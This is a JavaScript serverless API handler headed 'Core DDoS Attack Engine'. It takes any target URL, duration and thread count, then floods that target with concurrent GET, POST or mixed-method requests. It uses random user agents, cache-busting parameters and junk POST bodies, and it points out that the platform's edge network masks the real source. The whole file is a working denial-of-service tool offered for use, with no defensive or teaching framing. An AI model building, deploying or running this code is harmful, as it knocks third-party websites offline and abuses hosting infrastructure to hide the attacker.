
// Core DDoS Attack Engine
// Endpoint: /api/ddos?target=url&duration=30&method=get&threads=20

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    
    if (req.method === 'OPTIONS') return res.status(200).end();

    const { target, duration = 30, method = 'get', threads = 20 } = req.query;
    
    if (!target) {
        return res.status(400).json({ error: 'Target URL required' });
    }

    const attackResult = await executeAttack(target, parseInt(duration), method, parseInt(threads));
    
    return res.status(200).json({
        status: 'Attack executed',
        target,
        duration,
        method,
        requests: attackResult.total,
        success: attackResult.success,
        failed: attackResult.failed,
        note: 'Vercel edge network detected as source IPs'
    });
}

async function executeAttack(target, duration, method, threads) {
    const results = { total: 0, success: 0, failed: 0 };
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);

    const attackFunctions = {
        get: async (url) => {
            try {
                const response = await fetch(url, {
                    headers: {
                        'User-Agent': generateUserAgent(),
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    },
                    timeout: 5000
                });
                return { success: response.ok };
            } catch {
                return { success: false };
            }
        },
        post: async (url) => {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': generateUserAgent()
                    },
                    body: generatePayload(1000),
                    timeout: 5000
                });
                return { success: response.ok };
            } catch {
                return { success: false };
            }
        },
        mixed: async (url) => {
            const methods = ['GET', 'POST', 'HEAD', 'OPTIONS'];
            const m = methods[Math.floor(Math.random() * methods.length)];
            try {
                const response = await fetch(url, {
                    method: m,
                    headers: {
                        'User-Agent': generateUserAgent(),
                        'X-Random': Math.random().toString(36)
                    },
                    timeout: 3000
                });
                return { success: response.ok };
            } catch {
                return { success: false };
            }
        }
    };

    const attackFn = attackFunctions[method] || attackFunctions.get;

    const attackBatch = async () => {
        const promises = [];
        for (let i = 0; i < threads; i++) {
            const url = target.includes('?') 
                ? `${target}&_=${Math.random()}&t=${Date.now()}`
                : `${target}?_=${Math.random()}&t=${Date.now()}`;
            promises.push(attackFn(url));
        }
        const batchResults = await Promise.allSettled(promises);
        batchResults.forEach(result => {
            results.total++;
            if (result.status === 'fulfilled' && result.value.success) {
                results.success++;
            } else {
                results.failed++;
            }
        });
    };

    while (Date.now() < endTime) {
        await attackBatch();
        await sleep(Math.random() * 50);
    }

    return results;
}

function generateUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function generatePayload(size) {
    let payload = '';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < size; i++) {
        payload += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return payload;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
                      }
